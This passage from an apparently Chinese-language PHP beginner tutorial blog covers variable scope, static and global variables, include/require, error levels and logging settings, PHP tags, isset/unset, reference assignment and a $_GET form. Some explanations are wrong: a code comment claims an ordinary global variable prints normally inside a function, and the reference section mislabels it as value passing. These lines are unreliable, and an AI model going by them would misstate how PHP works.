class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady is a hacker</span><br></pre></td></tr></table></figure><h5 id="静态变量：一个特殊的局部变量"><a href="#静态变量：一个特殊的局部变量" class="headerlink" title="静态变量：一个特殊的局部变量"></a>静态变量：一个特殊的局部变量</h5><p>静态变量的含义：</p><p>在函数内部，使用static关键字修饰的变量。</p><p>静态变量的特点：</p><p>静态变量的值不会在函数调用结束时被销毁，而是会一直保留。</p><p>也就是说，当再次调用函数时，该变量（的值）还能继续使用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Jelly</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">static</span> $v3=<span class="number">20</span>;</span><br><span class="line">    $v3++;</span><br><span class="line">    <span class="keyword">echo</span> $v3.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Jelly();</span><br><span class="line">Jelly();</span><br><span class="line">Jelly();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td></tr></table></figure><h5 id="全局作用域与全局变量"><a href="#全局作用域与全局变量" class="headerlink" title="全局作用域与全局变量"></a>全局作用域与全局变量</h5><p>函数外部范围的作用域，其中定义的变量就是全局变量。</p><p>全局变量只能在其所在的全局作用域中可以直接使用（访问）。</p><h5 id="超全局作用域与超全局变量"><a href="#超全局作用域与超全局变量" class="headerlink" title="超全局作用域与超全局变量"></a>超全局作用域与超全局变量</h5><p>包括局部作用域和全局作用域的的整个作用域范围。</p><p>超全局变量可以在所有范围中使用（访问）。</p><p>只有有限的10来个系统预定义变量是超全局变量，包括：$_GET, $_POST, $_REQUEST等。</p><p>所以，系统预定义变量，也被统称为超全局变量。</p><h5 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$steady_get=$_GET[<span class="string">&#x27;steady&#x27;</span>];</span><br><span class="line">$steady=<span class="string">&quot;steady is a hacker&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Jelly</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $v3=<span class="number">20</span>;</span><br><span class="line">    $v3++;</span><br><span class="line">    <span class="keyword">echo</span> $steady;<span class="comment">//报错。</span></span><br><span class="line">    <span class="keyword">echo</span> $steady_get;<span class="comment">//正常输出。</span></span><br><span class="line">&#125;</span><br><span class="line">Jelly();</span><br><span class="line"><span class="keyword">echo</span> $v3;<span class="comment">//报错。</span></span><br><span class="line"><span class="keyword">echo</span> $steady_get;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="一个特别的超全局变量：-GLOBALS"><a href="#一个特别的超全局变量：-GLOBALS" class="headerlink" title="一个特别的超全局变量：$GLOBALS"></a>一个特别的超全局变量：$GLOBALS</h5><p>一个数组，其中存储了我们自己定义的所有全局变量。</p><p>在全局作用域中定义如下变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$v1 &#x3D; 1;&#x2F;&#x2F;这一行执行，就有了一个这个：$GLOBALS[&#39;v1&#39;], 其值为1</span><br><span class="line">$v2 &#x3D; &#39;abc&#39;;&#x2F;&#x2F;这一行执行，就有了一个这个：$GLOBALS[&#39;v2&#39;], 其值为&#39;abc&#39;</span><br><span class="line">$v3 &#x3D; true;&#x2F;&#x2F;这一行执行，就有了一个这个：$GLOBALS[&#39;v3&#39;], 其值为true</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$steady=<span class="string">&quot;steady is a hacker&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Jelly</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $GLOBALS[<span class="string">&#x27;steady&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">Jelly();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady is a hacker</span><br></pre></td></tr></table></figure><h5 id="一个特别的的关键字：global"><a href="#一个特别的的关键字：global" class="headerlink" title="一个特别的的关键字：global"></a>一个特别的的关键字：global</h5><p>用于在局部作用域中，修饰一个跟全局变量同名的局部变量。</p><p>此时该局部变量也可以使用全局变量的值了——实际上他们其实是类似变量引用关系。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$steady=<span class="string">&quot;steady is a hacker&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Jelly</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $steady;</span><br><span class="line">    <span class="keyword">echo</span> $steady;</span><br><span class="line">&#125;</span><br><span class="line">Jelly();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady is a hacker</span><br></pre></td></tr></table></figure><h2 id="文件加载"><a href="#文件加载" class="headerlink" title="文件加载"></a>文件加载</h2><h3 id="文件加载的含义"><a href="#文件加载的含义" class="headerlink" title="文件加载的含义"></a>文件加载的含义</h3><p>含义：</p><p>将一个（别的）文件包含到当前文件中，成为当前文件运行过程中的一部分。通常，一些公共的代码，在多个页面都需要用到的时候，会做成一个独立的文件。然后在不同的页面需要用到的时候，直接载入进来就可以了。</p><p>语法：</p><p>include  “要载入的文件路径”;        //可以是相对路径，或本地物理路径。</p><p>说明：</p><p>可以载入php文件，也可以载入html文件。</p><p>原理：</p><p>载入一个文件的本质是：将被载入的文件“插入”到当前载入代码所在的位置。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;文件头部&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;./inc/steady.html&#x27;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"> &lt;hr&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;./inc/steady.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;当前的页码为：&quot;</span> . $page;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="文件加载的四种方式"><a href="#文件加载的四种方式" class="headerlink" title="文件加载的四种方式"></a>文件加载的四种方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include  &#39;要加载的文件&#39;；</span><br><span class="line">include_once    &#39;要加载的文件&#39;；</span><br><span class="line">require  &#39;要加载的文件&#39;；</span><br><span class="line">require_once  &#39;要加载的文件&#39;；</span><br></pre></td></tr></table></figure><h3 id="四种方式的区别"><a href="#四种方式的区别" class="headerlink" title="四种方式的区别"></a>四种方式的区别</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include：每次都载入文件（可能会重复载入），如果载入失败，在报错后继续执行后续语句；</span><br><span class="line">include_once：只载入一次（不会重复载入），如果载入失败，在报错后继续执行后续语句；</span><br><span class="line">require：每次都载入文件（可能会重复载入），如果载入失败，在报错后终止程序；</span><br><span class="line">require_once：只载入一次（不会重复载入），如果载入失败，在报错后终止程序；</span><br></pre></td></tr></table></figure><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><h3 id="错误分类"><a href="#错误分类" class="headerlink" title="错误分类"></a>错误分类</h3><p>语法错误：</p><p>程序不能运行，是在运行之前，检查语法的时候，就发现语法出错，结果是提示错误，不运行程序。</p><p>运行时错误：</p><p>语法检查没错，然后开始运行，在运行中出现了错误，然后报错。</p><p>这是开发中最常见的错误。</p><p>逻辑错误：</p><p>程序能运行，且一直到结束没有报错，但执行得到的结果却是错的。</p><h3 id="常见错误代号"><a href="#常见错误代号" class="headerlink" title="常见错误代号"></a>常见错误代号</h3><p>常见错误代号有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">E_NOTICE：</span><br><span class="line"></span><br><span class="line">提示性错误，轻微；</span><br><span class="line"></span><br><span class="line">错误发生后，后面的程序继续执行。</span><br><span class="line"></span><br><span class="line">E_WARNING：</span><br><span class="line"></span><br><span class="line">警告性错误，稍微严重；</span><br><span class="line"></span><br><span class="line">错误发生后，后面的程序继续执行。</span><br><span class="line"></span><br><span class="line">E_ERROR：</span><br><span class="line"></span><br><span class="line">严重错误&#x2F;致命错误；</span><br><span class="line"></span><br><span class="line">错误发生后，后面的程序不再执行！</span><br><span class="line"></span><br><span class="line">E_PARSE：</span><br><span class="line"></span><br><span class="line">语法错误（语法解析错误）；</span><br><span class="line"></span><br><span class="line">语法解释错误，是直接就不运行程序。</span><br><span class="line"></span><br><span class="line">E_USER_NOTICE：</span><br><span class="line"></span><br><span class="line">用户自定义的提示错误</span><br><span class="line"></span><br><span class="line">E_USER_WARNING：</span><br><span class="line"></span><br><span class="line">用户自定义的警告错误</span><br><span class="line"></span><br><span class="line">E_USER_ERROR：</span><br><span class="line"></span><br><span class="line">用户自定义的严重错误</span><br><span class="line"></span><br><span class="line">E_ALL：</span><br><span class="line"></span><br><span class="line">它是一个代表“所有”错误的代号。</span><br></pre></td></tr></table></figure><p>说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1，这些错误代号，其实只是系统预先设定的一些常量，他们的值大约是：1， 2， 4， 8， 16.....</span><br><span class="line"></span><br><span class="line">2，这些错误代号，通常只是用于对错误控制时进行“设置”使用。</span><br><span class="line"></span><br><span class="line">3，他们是一系列的整数，并具有一定的规律：1,2,4,8,16,32,64， 。。。。</span><br><span class="line"></span><br><span class="line">4，可以在php.ini中使用（设置）他们，如下所示：</span><br></pre></td></tr></table></figure><h3 id="错误显示设置"><a href="#错误显示设置" class="headerlink" title="错误显示设置"></a>错误显示设置</h3><p>我们可以对此进行设置，以决定以下两点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1、设置display_errors以决定是否显示错误：</span><br><span class="line"></span><br><span class="line">在php.ini中设置：display_errors &#x3D; On或Off</span><br><span class="line"></span><br><span class="line">这里设置，影响所有使用该php语言引擎的代码（网站页面）</span><br><span class="line"></span><br><span class="line">在php文件中设置：ini_set(&#39;display_errors&#39;, 1或0);&#x2F;&#x2F;1表示显示，0不显示</span><br><span class="line"></span><br><span class="line">在这里设置，只影响当前网页代码本身。</span><br><span class="line"></span><br><span class="line">2、设置error_reporting以决定显示哪些错误：</span><br><span class="line"></span><br><span class="line">在php.ini中设置：error_reporting &#x3D; 错误代号1  | 错误代号2  |  ..... &#x2F;&#x2F;(要显示的就写出来，或者可以写E_ALL, 表示显示所有）</span><br><span class="line"></span><br><span class="line">在代码php文件中，道理类似：ini_set(&#39;error_reporting&#39;, 错误代号1  | 错误代号2  |  .....）</span><br></pre></td></tr></table></figure><h3 id="错误日志设置"><a href="#错误日志设置" class="headerlink" title="错误日志设置"></a>错误日志设置</h3><p>如果有错误发生（触发了错误），默认情况下不会将错误信息记录（保存）下来。</p><p>我们可以对此进行设置，以决定以下两点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、设置log_errors以决定是否记录错误：</span><br><span class="line"></span><br><span class="line">php.ini中设置：log_errors &#x3D; On 或 Off</span><br><span class="line"></span><br><span class="line">代码文件中设置：ini_set (&#39;log_errors&#39;, 1或0)</span><br><span class="line"></span><br><span class="line">2、设置error_log以决定记录到哪里：</span><br><span class="line"></span><br><span class="line">通常，就设置为一个文件名，php系统会在网站的每个文件夹下都建立该文件，并记录错误。</span><br><span class="line"></span><br><span class="line">php.ini中：error_log &#x3D; error.txt;&#x2F;&#x2F;它是纯文本的</span><br><span class="line"></span><br><span class="line">代码中：ini_set(&quot;error_log&quot;,  &#39;error.txt&#39;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP开发学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP开发学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发学习--PHP基础1</title>
      <link href="2019/11/11/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0--PHP%E5%9F%BA%E7%A1%801/"/>
      <url>2019/11/11/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0--PHP%E5%9F%BA%E7%A1%801/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP基础"><a href="#PHP基础" class="headerlink" title="PHP基础"></a>PHP基础</h1><h2 id="PHP基本语法规则"><a href="#PHP基本语法规则" class="headerlink" title="PHP基本语法规则"></a>PHP基本语法规则</h2><h3 id="PHP标记三种写法"><a href="#PHP标记三种写法" class="headerlink" title="PHP标记三种写法"></a>PHP标记三种写法</h3><p>steady.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>steady.php，在PHP之后被弃用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">    phpinfo();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>steady.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>需要到php.ini中进行配置：short_open_tag = On//默认为Off，表示不能用该形式。</p><p>注意：</p><p>纯PHP代码：可以省略标记结尾符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();</span><br></pre></td></tr></table></figure><h3 id="PHP语句结束符"><a href="#PHP语句结束符" class="headerlink" title="PHP语句结束符"></a>PHP语句结束符</h3><p>使用英文分号（;）表示一条语句的结束。</p><h3 id="PHP注释"><a href="#PHP注释" class="headerlink" title="PHP注释"></a>PHP注释</h3><h4 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h4><p>两个斜杠： //斜杠后面的部分就是注释内容，PHP语言不会去处理它（不执行）。</p><p>多行注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">这是注释内容。。。</span><br><span class="line">可以写多行</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$steady&#x3D;good</span><br></pre></td></tr></table></figure><p>注意：变量区分大小写。</p><h3 id="变量的命令规则"><a href="#变量的命令规则" class="headerlink" title="变量的命令规则"></a>变量的命令规则</h3><p>1，构成：字母、数字、下划线；</p><p>2，开头：字母或下划线；</p><p>3，注意：变量名不要跟系统中的“关键字”（即语法所用单词）重复——关键字不多，也就几十个。</p><h3 id="变量的四种基本操作"><a href="#变量的四种基本操作" class="headerlink" title="变量的四种基本操作"></a>变量的四种基本操作</h3><h4 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$steady&#x3D;good</span><br></pre></td></tr></table></figure><h4 id="取值"><a href="#取值" class="headerlink" title="取值"></a>取值</h4><h4 id="判断变量isset"><a href="#判断变量isset" class="headerlink" title="判断变量isset()"></a>判断变量<code>isset()</code></h4><p>判断一个”变量名”是否里面存储了数据，判断的结果是：true（真，表示有），或者false（假，表示没有）。</p><p>null是一个特殊的”数据”（值），该数据的含义是：没有数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$steady=<span class="string">&quot;steady is good&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>($steady);</span><br><span class="line">var_dump(<span class="keyword">isset</span>($steady));</span><br><span class="line">$steady2=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>($steady2);</span><br><span class="line">var_dump(<span class="keyword">isset</span>($steady2));</span><br><span class="line">$steady3=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>($steady13);</span><br><span class="line">var_dump(<span class="keyword">isset</span>($steady13));</span><br><span class="line">$steady4=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>($steady4);</span><br><span class="line">var_dump(<span class="keyword">isset</span>($steady4));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">/Applications/MAMP/htdocs/<span class="number">1.</span>php:<span class="number">4</span>:boolean <span class="literal">true</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">/Applications/MAMP/htdocs/<span class="number">1.</span>php:<span class="number">7</span>:boolean <span class="literal">true</span></span><br><span class="line">/Applications/MAMP/htdocs/<span class="number">1.</span>php:<span class="number">10</span>:boolean <span class="literal">false</span></span><br><span class="line">/Applications/MAMP/htdocs/<span class="number">1.</span>php:<span class="number">13</span>:boolean <span class="literal">false</span></span><br></pre></td></tr></table></figure><h4 id="删除-销毁变量unset"><a href="#删除-销毁变量unset" class="headerlink" title="删除/销毁变量unset()"></a>删除/销毁变量unset()</h4><p>删除变量的本质是：断开变量名跟其关联过的那个数据之间的”联系”。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$steady=<span class="string">&quot;steady is good&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">isset</span>($steady);</span><br><span class="line">var_dump(<span class="keyword">isset</span>($steady));</span><br><span class="line"><span class="keyword">unset</span>($steady);</span><br><span class="line">$steady2=<span class="keyword">isset</span>($steady);</span><br><span class="line">var_dump($steady2);</span><br><span class="line"><span class="keyword">echo</span> $steady;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">/Applications/MAMP/htdocs/<span class="number">1.</span>php:<span class="number">4</span>:boolean <span class="literal">true</span></span><br><span class="line">/Applications/MAMP/htdocs/<span class="number">1.</span>php:<span class="number">7</span>:boolean <span class="literal">false</span></span><br></pre></td></tr></table></figure><h3 id="变量传值"><a href="#变量传值" class="headerlink" title="变量传值"></a>变量传值</h3><p>只有两种传数据的方式：值传递，和引用传递。</p><h4 id="值传递"><a href="#值传递" class="headerlink" title="值传递"></a>值传递</h4><p>两个变量在赋值之后，就相互独立，各自有自己的存放空间。改变一个，另一个不受影响。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$steady=<span class="string">&quot;steady is good&quot;</span>;</span><br><span class="line">$jelly=$steady;</span><br><span class="line"><span class="keyword">echo</span> $steady.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $jelly;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady is good</span><br><span class="line">steady is good</span><br></pre></td></tr></table></figure><h4 id="引用传递"><a href="#引用传递" class="headerlink" title="引用传递"></a>引用传递</h4><p>两个变量在使用值传递的时候，只要两个变量之间的关系确定为值传递，那么其中一个变量改变，另一个变量也会改变。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$steady=<span class="string">&quot;steady is good&quot;</span>;</span><br><span class="line">$jelly=&amp;$steady;</span><br><span class="line"><span class="keyword">echo</span> $steady.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$jelly=<span class="string">&quot;20&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $jelly.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$steady=<span class="string">&quot;30&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $jelly.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steady is good</span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="number">30</span></span><br></pre></td></tr></table></figure><h3 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h3><h4 id="GET变量"><a href="#GET变量" class="headerlink" title="$_GET变量"></a>$_GET变量</h4><p>steady.html</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;steady-GET&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;steady_get.php&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">        姓名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;userName&quot;</span>&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        年龄：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;age&quot;</span>&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>steady_get.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_GET[<span class="string">&#x27;userName&#x27;</span>];<span class="comment">//这里的变量名字就是我们表单中的变量名字。</span></span><br><span class="line">$age=$_GET[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;名字为：&quot;</span>.$name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;年龄为：&quot;</span>.$age;</span><br><span class="line"><span 